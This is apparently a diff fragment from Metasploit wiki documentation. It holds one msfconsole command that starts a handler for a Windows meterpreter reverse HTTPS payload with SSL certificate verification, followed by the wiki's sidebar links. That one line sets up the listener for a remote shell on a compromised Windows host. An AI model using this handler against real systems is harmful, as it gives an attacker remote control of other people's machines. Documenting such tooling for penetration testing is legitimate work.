@@ -1,0 +1,14 @@
+./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
+ Pages 132
+Metasploit Wiki Pages
+
+Home Welcome to Metasploit!
+Using Metasploit A collection of useful links for penetration testers.
+Setting Up a Metasploit Development Environment From apt-get install to git push.
+CONTRIBUTING.md What should your contributions look like?
+Landing Pull Requests Working with other people's contributions.
+Using Git All about Git and GitHub.
+Contributing to Metasploit Be a part of our open source community.
+Meterpreter All about the Meterpreter payload.
+Clone this wiki locally
+
